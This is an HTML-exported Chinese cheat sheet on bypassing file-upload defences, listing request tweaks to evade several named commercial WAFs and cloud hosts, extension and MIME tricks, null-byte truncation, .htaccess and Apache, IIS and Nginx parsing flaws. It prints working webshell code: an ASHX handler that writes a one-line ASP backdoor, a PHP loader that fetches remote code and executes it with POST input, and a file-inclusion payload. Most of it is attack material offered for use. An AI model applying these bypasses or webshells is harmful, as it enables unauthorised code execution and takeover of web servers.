<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="上传绕过整理"><span class="cs83F14626">上传绕过整理</span></a></h2>
		<h3 class="cs868C439D">
			<a name="waf绕过"><span class="csD1E291E2">WAF</span><span class="csD6CA00D2">绕过</span></a></h3>
		<h4 class="cs868C439D">
			<a name="安全狗绕过"><span class="cs6EDCDAE2">安全狗绕过</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">绕过思路：对文件的内容，数据。数据包进行处理。</span></p><p class="cs3A447A38"><span class="cs7FFD2630">关键点在这里</span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ian.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234">form-data; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234">~form-data;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.</span><span class="cs9C1B1871">通过替换大小写来进行绕过</span></p><p class="cs3A447A38"><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/octet-stream</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234">Content-Disposition &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234">content-Disposition</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234"> form-data &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234">Form-data</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234"> Content-Type &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234">content-Type</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.</span><span class="cs9C1B1871">通过删减空格来进行绕过</span></p><p class="cs3A447A38"><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/octet-stream</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234">Content-Disposition: form-data &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">冒号后面</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">增加或减少一个空格</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234">form-data; name=&quot;file&quot;; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">分号后面</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">增加或减少一个空格</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234"> Content-Type: application/octet-stream &nbsp;&nbsp;</span><span class="cs7FFD2630">冒号后面</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">增加一个空格</span></p><p class="cs40DD2BC9"><span class="cs8926E06">4.</span><span class="cs9C1B1871">通过字符串拼接绕过</span></p><p class="cs3A447A38"><span class="cs7FFD2630">看</span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234"> form-data </span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234"> &nbsp;&nbsp;f+orm-data</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">将</span><span class="cs9FB05234"> from-data </span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234"> &nbsp;&nbsp;form-d+ata</span></p><p class="cs40DD2BC9"><span class="cs8926E06">5.</span><span class="cs9C1B1871">双文件上传绕过</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;</span><span class="cs7FFD2630">上传</span><span class="cs9FB05234">&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/form&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">6.HTTP header </span><span class="cs9C1B1871">属性值绕过</span></p><p class="cs3A447A38"><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">我们通过替换</span><span class="cs9FB05234">form-data </span><span class="cs7FFD2630">为</span><span class="cs9FB05234">*</span><span class="cs7FFD2630">来绕过</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">7.HTTP header </span><span class="cs9C1B1871">属性名称绕过</span></p><p class="cs3A447A38"><span class="cs7FFD2630">源代码</span><span class="cs9FB05234">:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">绕过内容如下：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">C.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">删除掉</span><span class="cs9FB05234">ontent-Type: image/jpeg</span><span class="cs7FFD2630">只留下</span><span class="cs9FB05234">c</span><span class="cs7FFD2630">，将</span><span class="cs9FB05234">.php</span><span class="cs7FFD2630">加</span><span class="cs9FB05234">c</span><span class="cs7FFD2630">后面即可，但是要注意额，双引号要跟着</span><span class="cs9FB05234">c.php&quot;.</span></p><p class="cs40DD2BC9"><span class="cs8926E06">8.</span><span class="cs9C1B1871">等效替换绕过</span></p><p class="cs3A447A38"><span class="cs7FFD2630">原内容：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">修改后</span><span class="cs9FB05234">:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">boundary</span><span class="cs7FFD2630">后面加入空格。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">9.</span><span class="cs9C1B1871">修改编码绕过</span></p><p class="cs3A447A38"><span class="cs7FFD2630">使用</span><span class="cs9FB05234">UTF-16</span><span class="cs7FFD2630">、</span><span class="cs9FB05234">Unicode</span><span class="cs7FFD2630">、双</span><span class="cs9FB05234">URL</span><span class="cs7FFD2630">编码等等</span></p><h4 class="cs868C439D">
			<a name="wts-waf-绕过上传"><span class="csBF12A472">WTS-WAF </span><span class="cs6EDCDAE2">绕过上传</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">原内容：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">添加回车</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span></p><h4 class="cs868C439D">
			<a name="百度云上传绕过"><span class="cs6EDCDAE2">百度云上传绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">是过了的，</span><span class="cs9FB05234">Php</span><span class="cs7FFD2630">就能过，或者</span><span class="cs9FB05234">PHP</span><span class="cs7FFD2630">，一句话自己合成图片马用</span><span class="cs9FB05234">Xise</span><span class="cs7FFD2630">连接即可。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</span></p><h4 class="cs868C439D">
			<a name="阿里云上传绕过"><span class="cs6EDCDAE2">阿里云上传绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">源代码：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jpg .Php&quot;Content-Type: image/jpeg</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">修改如下：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">没错，将</span><span class="cs9FB05234">=</span><span class="cs7FFD2630">号这里回车删除掉</span><span class="cs9FB05234">Content-Type: image/jpeg</span><span class="cs7FFD2630">即可绕过。</span></p><h4 class="cs868C439D">
			<a name="X9febda33ecf4138f7fccf1689038b51d69ef927"><span class="csBF12A472">360</span><span class="cs6EDCDAE2">主机上传绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">源代码</span><span class="cs9FB05234">:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">绕过内容如下：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content- Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Disposition </span><span class="cs7FFD2630">修改为</span><span class="cs9FB05234"> Content-</span><span class="cs7FFD2630">空格</span><span class="cs9FB05234">Disposition</span></p><h4 class="cs868C439D">
			<a name="mime类型绕过"><span class="csBF12A472">MIME</span><span class="cs6EDCDAE2">类型绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">上传木马时，提示格式错误。直接抓包修改</span><span class="cs9FB05234">Content-Type </span><span class="cs7FFD2630">为正确的格式尝试绕过</span></p><h4 class="cs868C439D">
			<a name="文件内容检测绕过"><span class="cs6EDCDAE2">文件内容检测绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">抓包，在正常图片末尾添加一句话木马</span></p><h4 class="cs868C439D">
			<a name="多次上传win特性绕过"><span class="cs6EDCDAE2">多次上传</span><span class="csBF12A472">Win</span><span class="cs6EDCDAE2">特性绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">多次上传同一个文件，</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">会自动更新补全</span><span class="cs9FB05234">TEST (1).php</span><span class="cs7FFD2630">。</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">有时会触发条件竞争，导致绕过。</span></p><h4 class="cs868C439D">
			<a name="条件竞争绕过"><span class="cs6EDCDAE2">条件竞争绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">通过</span><span class="cs9FB05234">BURP</span><span class="cs7FFD2630">不断发包，导致不断写入</span><span class="cs9FB05234">Webshell</span><span class="cs7FFD2630">，再写入速度频率上超过安全软件查杀频率，导致绕过。</span></p><h4 class="cs868C439D">
			<a name="content-length绕过"><span class="csBF12A472">CONTENT-LENGTH</span><span class="cs6EDCDAE2">绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，</span><span class="cs9FB05234">Web</span><span class="cs7FFD2630">服务器上的最大长度限制。我们可以使用不同大小的文件来</span><span class="cs9FB05234">fuzzing</span><span class="cs7FFD2630">上传程序，从而计算出它的限制范围。</span></p><h4 class="cs868C439D">
			<span class="cs6EDCDAE2">文件内容检测绕过</span></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">针对文件内容检测的绕过，一般有两种方式，</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">1.</span><span class="cs7FFD2630">制作图片马</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">2.</span><span class="cs7FFD2630">文件幻术头绕过</span></p><h4 class="cs868C439D">
			<a name="垃圾数据填充绕过"><span class="cs6EDCDAE2">垃圾数据填充绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">修改</span><span class="cs9FB05234">HTTP</span><span class="cs7FFD2630">请求，再之中加入大量垃圾数据。</span></p><h3 class="cs868C439D">
			<a name="黑名单后缀绕过"><span class="csD6CA00D2">黑名单后缀绕过</span></a></h3>
		<h4 class="cs868C439D">
			<a name="文件扩展名绕过"><span class="cs6EDCDAE2">文件扩展名绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">Php</span><span class="cs7FFD2630">除了可以解析</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">后缀</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">还可以解析</span><span class="cs9FB05234">php2.php3</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">php4 </span><span class="cs7FFD2630">后缀</span></p><h4 class="cs868C439D">
			<a name="ashx上传绕过"><span class="csBF12A472">ashx</span><span class="cs6EDCDAE2">上传绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">cer,asa,cdx</span><span class="cs7FFD2630">等等无法使用时候。</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">解析后就会生成一个</span><span class="cs9FB05234">test.asp</span><span class="cs7FFD2630">的马，你就可以连接这个</span><span class="cs9FB05234">test.asp &nbsp;</span><span class="cs7FFD2630">密码为</span><span class="cs9FB05234">:put</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">using System;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">using System.Web;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">using System.IO;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public class Handler : IHttpHandler {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void ProcessRequest (HttpContext context) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.Response.ContentType = &quot;text/plain&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">这里会在目录下生成一个</span><span class="cs9FB05234">test.asp</span><span class="cs7FFD2630">的文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;test.asp&quot;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">这里是写入一句话木马</span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs7FFD2630">密码是：</span><span class="cs9FB05234">ptu</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file1.Write(&quot;&lt;%response.clear:execute request(&quot;put&quot;):response.End%&gt;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file1.Flush();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file1.Close(); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public bool IsReusable {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;get {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><h4 class="cs868C439D">
			<a name="特殊文件名绕过"><span class="cs6EDCDAE2">特殊文件名绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">比如发送的</span><span class="cs9FB05234"> http</span><span class="cs7FFD2630">包里把文件名改成</span><span class="cs9FB05234"> test.asp. </span><span class="cs7FFD2630">或</span><span class="cs9FB05234"> test.asp_(</span><span class="cs7FFD2630">下划线为空格</span><span class="cs9FB05234">)</span><span class="cs7FFD2630">，这种命名方式</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">在</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">系统里是不被允许的，所以需要在</span><span class="cs9FB05234"> burp</span><span class="cs7FFD2630">之类里进行修改，然后绕过验证后，会</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">被</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">系统自动去掉后面的点和空格，但要注意</span><span class="cs9FB05234">Unix/Linux</span><span class="cs7FFD2630">系统没有这个特性。</span></p><h4 class="cs868C439D">
			<a name="windows流特性绕过"><span class="csBF12A472">Windows</span><span class="cs6EDCDAE2">流特性绕过</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">php</span><span class="cs7FFD2630">在</span><span class="cs9FB05234">windows</span><span class="cs7FFD2630">的时候如果文件名</span><span class="cs9FB05234">+&quot;::$DATA&quot;</span><span class="cs7FFD2630">会把</span><span class="cs9FB05234">::$DATA</span><span class="cs7FFD2630">之后的数据当成文件流处理</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">不会检测后缀名</span><span class="cs9FB05234">.</span><span class="cs7FFD2630">且保持</span><span class="cs9FB05234">&quot;::$DATA&quot;</span><span class="cs7FFD2630">之前的文件名。</span></p><h3 class="cs868C439D">
			<a name="白名单后缀绕过"><span class="csD6CA00D2">白名单后缀绕过</span></a></h3>
		<h4 class="cs868C439D">
			<a name="Xcece7693b9ff81a198da26bb7c84a880e97dcc2"><span class="csBF12A472">00</span><span class="cs6EDCDAE2">截断绕过上传</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">php .jpg &nbsp;&nbsp;</span><span class="cs7FFD2630">空格二进制</span><span class="cs9FB05234">20</span><span class="cs7FFD2630">改为</span><span class="cs9FB05234">00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">IIS 6.0 </span><span class="cs7FFD2630">目录路径检测解析绕过</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">上传路径改为</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">XXX/1.asp/</span></p><h4 class="cs868C439D">
			<a name="htaccess解析漏洞"><span class="csBF12A472">htaccess</span><span class="cs6EDCDAE2">解析漏洞</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">上传的</span><span class="cs9FB05234">jpg</span><span class="cs7FFD2630">文件都会以</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">格式解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">.htaccess</span><span class="cs7FFD2630">内容：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">AddType &nbsp;&nbsp;&nbsp;application/x-httpd-php &nbsp;&nbsp;&nbsp;.jpg</span></p><h4 class="cs868C439D">
			<a name="突破mime限制上传"><span class="cs6EDCDAE2">突破</span><span class="csBF12A472">MIME</span><span class="cs6EDCDAE2">限制上传</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">方法：找一个正常的可上传的查看其的</span><span class="cs9FB05234">MIME</span><span class="cs7FFD2630">类型，然后将马子的</span><span class="cs9FB05234">MIME</span><span class="cs7FFD2630">改成合法的</span><span class="cs9FB05234">MIME</span><span class="cs7FFD2630">即可。</span></p><h4 class="cs868C439D">
			<a name="apache解析漏洞"><span class="csBF12A472">Apache</span><span class="cs6EDCDAE2">解析漏洞</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">1.</span><span class="cs7FFD2630">一个文件名为</span><span class="cs9FB05234">test.x1.x2.x3</span><span class="cs7FFD2630">的文件，</span><span class="cs9FB05234">apache</span><span class="cs7FFD2630">会从</span><span class="cs9FB05234">x3</span><span class="cs7FFD2630">的位置开始尝试解析，如果</span><span class="cs9FB05234">x3</span><span class="cs7FFD2630">不属于</span><span class="cs9FB05234">apache</span><span class="cs7FFD2630">能够解析的扩展名，那么</span><span class="cs9FB05234">apache</span><span class="cs7FFD2630">会尝试去解析</span><span class="cs9FB05234">x2</span><span class="cs7FFD2630">，直到能够解析到能够解析的为止，否则就会报错。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">2.CVE-2017-15715</span><span class="cs7FFD2630">，这个漏洞利用方式就是上传一个文件名最后带有换行符</span><span class="cs9FB05234">(</span><span class="cs7FFD2630">只能是</span><span class="cs9FB05234">\x0A</span><span class="cs7FFD2630">，如上传</span><span class="cs9FB05234">a.php</span><span class="cs7FFD2630">，然后在</span><span class="cs9FB05234">burp</span><span class="cs7FFD2630">中修改文件名为</span><span class="cs9FB05234">a.php\x0A)</span><span class="cs7FFD2630">，以此来绕过一些黑名单过滤。</span></p><h4 class="cs868C439D">
			<a name="iis解析漏洞"><span class="csBF12A472">IIS</span><span class="cs6EDCDAE2">解析漏洞</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">IIS6.0</span><span class="cs7FFD2630">在解析</span><span class="cs9FB05234">asp</span><span class="cs7FFD2630">格式的时候有两个解析漏洞，一个是如果目录名包含</span><span class="cs9FB05234">&quot;.asp&quot;</span><span class="cs7FFD2630">字符串，</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">那么这个目录下所有的文件都会按照</span><span class="cs9FB05234">asp</span><span class="cs7FFD2630">去解析，另一个是只要文件名中含有</span><span class="cs9FB05234">&quot;.asp;&quot;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">会优先按</span><span class="cs9FB05234">asp</span><span class="cs7FFD2630">来解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">IIS7.0/7.5</span><span class="cs7FFD2630">是对</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">解析时有一个类似于</span><span class="cs9FB05234">Nginx</span><span class="cs7FFD2630">的解析漏洞，对任意文件名只要在</span><span class="cs9FB05234">URL</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">后面追加上字符串</span><span class="cs9FB05234">&quot;/</span><span class="cs7FFD2630">任意文件名</span><span class="cs9FB05234">.php&quot;</span><span class="cs7FFD2630">就会按照</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">的方式去解析；</span></p><h4 class="cs868C439D">
			<a name="nginx解析漏洞"><span class="csBF12A472">Nginx</span><span class="cs6EDCDAE2">解析漏洞</span></a></h4>
		<p class="cs3A447A38"><span class="cs7FFD2630">解析：</span><span class="cs9FB05234"> (</span><span class="cs7FFD2630">任意文件名</span><span class="cs9FB05234">)/(</span><span class="cs7FFD2630">任意文件名</span><span class="cs9FB05234">).php | (</span><span class="cs7FFD2630">任意文件名</span><span class="cs9FB05234">)%00.php</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">描述：目前</span><span class="cs9FB05234">Nginx</span><span class="cs7FFD2630">主要有这两种漏洞，一个是对任意文件名，在后面添加</span><span class="cs9FB05234">/</span><span class="cs7FFD2630">任意文件名</span><span class="cs9FB05234">.php</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">的解析漏洞，比如原本文件名是</span><span class="cs9FB05234">test.jpg</span><span class="cs7FFD2630">，可以添加为</span><span class="cs9FB05234">test.jpg/x.php</span><span class="cs7FFD2630">进行解析攻击。</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">还有一种是对低版本的</span><span class="cs9FB05234">Nginx</span><span class="cs7FFD2630">可以在任意文件名后面添加</span><span class="cs9FB05234">%00.php</span><span class="cs7FFD2630">进行解析攻击。</span></p><h4 class="cs868C439D">
			<a name="解析漏洞"><span class="cs6EDCDAE2">解析漏洞</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">Content-Disposition: form-data; name=&quot;file&quot;; &nbsp;filename=php.php;.jpg</span></p><h3 class="cs868C439D">
			<a name="前端限制绕过"><span class="csD6CA00D2">前端限制绕过</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">1.</span><span class="cs7FFD2630">使用</span><span class="cs9FB05234">BURP</span><span class="cs7FFD2630">抓包修改后重放</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">2.</span><span class="cs7FFD2630">或者使用浏览器中元素审查，修改允许或禁止上传文件类型。</span></p><h3 class="cs868C439D">
			<a name="下载绕过"><span class="csD6CA00D2">下载绕过</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">远程下载文件绕过</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$str = file_get_contents(&#39;http://127.0.0.1/ian.txt&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$str($_post[&#39;ian&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
			<a name="文件包含绕过"><span class="csD6CA00D2">文件包含绕过</span></a></h3>
		<p class="cs3A447A38"><span class="cs7FFD2630">上传图片木马</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$x=$_GET[&#39;x&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include($x);</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">访问</span><span class="cs9FB05234">:http://www.xxxx.com/news.php?x=xxxxxx.jp</span></p></body>
</html>
